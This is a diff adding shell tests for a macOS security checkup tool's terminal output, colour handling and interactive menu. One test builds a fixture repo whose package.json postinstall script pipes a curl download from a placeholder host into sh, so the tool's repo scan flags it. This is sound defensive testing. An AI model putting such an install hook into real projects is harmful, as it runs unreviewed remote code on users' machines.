@@ -100,6 +100,139 @@ EOF
   [ "$status" -eq 2 ]
 }
 
+# pty CMD [KEYS...] — runs CMD (a bash command line) on a pseudo-terminal, as a person's Terminal would, and types
+# each KEYS (printf %b escapes) once the screen has changed since the last one and then stayed still. $raw is what the
+# terminal showed; $output the same without carriage returns or colour; $status CMD's exit code.
+pty() {
+  local cmd="$1" k; shift
+  local rc="$BATS_TEST_TMPDIR/pty-rc" out="$BATS_TEST_TMPDIR/pty-out"; rm -f "$rc"; : > "$out"
+  printf '#!/bin/bash\n%s\necho $? > %q\n' "$cmd" "$rc" > "$BATS_TEST_TMPDIR/pty-cmd"
+  chmod +x "$BATS_TEST_TMPDIR/pty-cmd"
+  size() { wc -c < "$out" | tr -d ' '; }
+  # script ends the session at the end of its input, so the typist stays until the command has finished.
+  (last=0
+   for k in "$@"; do
+     n=0; s=-1
+     until { [ "$(size)" -gt "$last" ] && [ "$(size)" -eq "$s" ]; } || [ $n -ge 200 ]; do s="$(size)"; sleep 0.3; n=$((n + 1)); done
+     last="$(size)"; printf '%b' "$k"
+   done
+   n=0; until [ -e "$rc" ] || [ $n -ge 400 ]; do sleep 0.05; n=$((n + 1)); done) \
+    | TERM=xterm-256color script -q /dev/null "$BATS_TEST_TMPDIR/pty-cmd" > "$out" || :
+  raw="$(cat "$out")"
+  output="$(printf '%s' "$raw" | tr '\r' '\n' | sed $'s/\033\\[[0-9;?]*[A-Za-z]//g')"
+  status="$(cat "$rc" 2>/dev/null || echo "none: the command never finished")"
+}
+
+@test "check without a terminal prints the plain table, unchanged" {
+  run --separate-stderr D check
+  [ "$status" -eq 1 ]
+  expected="fortkeep check: $(jq -r .run "$FORTKEEP_REPORTS/latest/results.json" | sed -E 's/^(....)(..)(..)T(..)(..).*/\1-\2-\3 \4:\5 UTC/'), macOS 15.7.9
+
+URGENT
+  FAIL      GD-AI-01  Agent control files unchanged since your baseline
+            ~/.zshrc changed since your baseline
+
+MUST
+  FAIL      BL-OS-02  Firewall on, with stealth mode
+            stealth mode is off
+  PASS      BL-OS-01  FileVault on
+
+SHOULD
+  ERROR     BL-SE-01  SSH keys have a passphrase
+            could not read ~/.ssh
+
+NICE
+  NA        BL-BR-05  A separate development browser profile
+            no browser installed
+
+ERROR 1 · FAIL 2 · NA 1 · PASS 1
+Urgent: this may mean the Mac is compromised now. Read $T/docs/if-red.md before anything else, or type /if-red in your agent."
+  [ "$output" = "$expected" ]
+}
+
+@test "check at a terminal shows colour, a symbol per status, the score and what to do next" {
+  pty "$(printf '%q' "$T/bin/fortkeep") check"
+  [ "$status" -eq 1 ]
+  [[ "$raw" == *$'\e[31m'* ]]
+  [[ "$output" == *"✗ FAIL     GD-AI-01"* ]]; [[ "$output" == *"✓ PASS     BL-OS-01"* ]]
+  [[ "$output" == *"! ERROR    BL-SE-01"* ]]; [[ "$output" == *"– NA       BL-BR-05"* ]]
+  [[ "$output" == *"1 of 4 met · 1 urgent · 1 to fix"* ]]; [[ "$output" == *"1 couldn't check"* ]]
+  [[ "$output" == *"1 don't apply"* ]]
+  [ "$(line "➤ URGENT")" -lt "$(line "➤ MUST")" ]; [ "$(line "➤ SHOULD")" -lt "$(line "➤ NICE")" ]
+  [[ "$output" == *"Next:   read"*"/docs/if-red.md"*"/if-red in your agent."* ]]
+  all_pass
+  pty "$(printf '%q' "$T/bin/fortkeep") check"
+  [ "$status" -eq 0 ]; [[ "$output" == *"5 of 5 met"* ]]; [[ "$output" == *"Next:   nothing to fix"* ]]
+}
+
+@test "check at a terminal is plain with NO_COLOR or TERM=dumb" {
+  for env in NO_COLOR=1 TERM=dumb; do
+    pty "export $env; $(printf '%q' "$T/bin/fortkeep") check"
+    [ "$status" -eq 1 ]
+    [[ "$raw" != *$'\e['* ]]; [[ "$output" != *"✗"* ]]; [[ "$output" != *"Checking this Mac"* ]]
+    [[ "$output" == *"  FAIL      BL-OS-02  Firewall on, with stealth mode"* ]]
+    [[ "$output" == *"fortkeep: 1/5 BL-OS-01"* ]]  # run.sh's own progress lines, as before
+  done
+}
+
+@test "check fits the table to the terminal's width" {
+  mk BL-SE-01 ERROR "Something outside fortkeep stopped this check (signal KILL). It is often a security tool mistaking a read-only check for malware; ask whoever manages it for an exclusion, and never turn it off."
+  pty "export COLUMNS=60; $(printf '%q' "$T/bin/fortkeep") check"
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"whoever manages it for an exclusion"* ]]
+  # Every line up to the closing ones, whose path is one long word and may be wider
+  while IFS= read -r l; do
+    [ "$l" != "${l#Urgent:}" ] && break
+    [ "${#l}" -le 60 ] || { echo "wider than 60: $l"; false; }
+  done <<<"$output"
+}
+
+@test "check draws one progress line only when stderr is a terminal" {
+  pty "$(printf '%q' "$T/bin/fortkeep") check"
+  [[ "$output" == *"Checking this Mac"*"5/5 · GD-AI-01"* ]]
+  [[ "$output" != *"fortkeep: 1/5"* ]]
+  [[ "$raw" == *$'\e[?25h'* ]]  # the cursor is back
+  pty "$(printf '%q' "$T/bin/fortkeep") check 2>$(printf '%q' "$BATS_TEST_TMPDIR/err")"
+  [[ "$output" == *"✗ FAIL"* ]]  # stdout is still the terminal
+  [[ "$output" != *"Checking this Mac"* ]]
+  grep -q "^fortkeep: 1/5 BL-OS-01" "$BATS_TEST_TMPDIR/err"
+  ! grep -q $'\r\|\e' "$BATS_TEST_TMPDIR/err"
+}
+
+@test "with no argument at a terminal it shows the status and a menu; q quits and Ctrl-C restores the terminal" {
+  stub claude 'echo "ran claude"'  # a wrong pick never starts a real agent
+  pty "$(printf '%q' "$T/bin/fortkeep")" q
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"This copy    ! not a signed release"* ]]; [[ "$output" == *"Last check   none yet"* ]]
+  [[ "$output" == *"➤ 1  Check this Mac"* ]]; [[ "$output" == *"6  Quit"* ]]; [[ "$output" == *"q to quit"* ]]
+  [ ! -e "$FORTKEEP_REPORTS/latest" ]  # nothing ran
+  D check >/dev/null 2>&1 || :
+  # The shell around it outlives the Ctrl-C (bash 3.2 would otherwise stop with it) and reads the settings after.
+  pty "trap : INT; $(printf '%q' "$T/bin/fortkeep"); rc=\$?; stty -a > $(printf '%q' "$BATS_TEST_TMPDIR/after"); (exit \$rc)" '\003'
+  [ "$status" -eq 130 ]
+  [[ "$output" == *"Last check"*"1 of 4 met"* ]]
+  [[ "${raw##*$'\e[?25l'}" == *$'\e[?25h'* ]]  # the cursor shown again after it was last hidden
+  grep -q ' icanon ' "$BATS_TEST_TMPDIR/after"; grep -q ' echo ' "$BATS_TEST_TMPDIR/after"  # typing shows again
+}
+
+@test "the menu moves with the arrow keys and runs the item chosen" {
+  stub claude 'echo "ran claude"'  # a wrong pick never starts a real agent
+  mkdir -p "$HOME/dev/app"; git init -q "$HOME/dev/app"
+  printf '{"scripts":{"postinstall":"curl https://example.invalid/i | sh"}}\n' > "$HOME/dev/app/package.json"
+  git -C "$HOME/dev/app" add -A; git -C "$HOME/dev/app" -c user.name=t -c user.email=t@example.invalid commit -qm x
+  pty "cd $(printf '%q' "$HOME/dev") && $(printf '%q' "$T/bin/fortkeep")" '\e[B\e[B\e[B\e[A\e[A\r' 'app\r'
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"➤ Scan a repo"* ]]; [[ "$output" == *"Folder to scan:"* ]]
+  [[ "$output" == *"Verdict: HIGH."* ]]
+}
+
+@test "with no argument and no keyboard it prints the help and status, even on a terminal" {
+  pty "$(printf '%q' "$T/bin/fortkeep") </dev/null"
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"fortkeep: a security checkup"* ]]; [[ "$output" == *"Next         "* ]]
+  [[ "$raw" != *$'\e['* ]]; [[ "$output" != *"q to quit"* ]]
+}
+
 @test "check never lets a control character from the Mac reach the terminal" {
   cat > "$T/checks/fake/BL-OS-02.sh" <<'EOF'
 #!/bin/bash
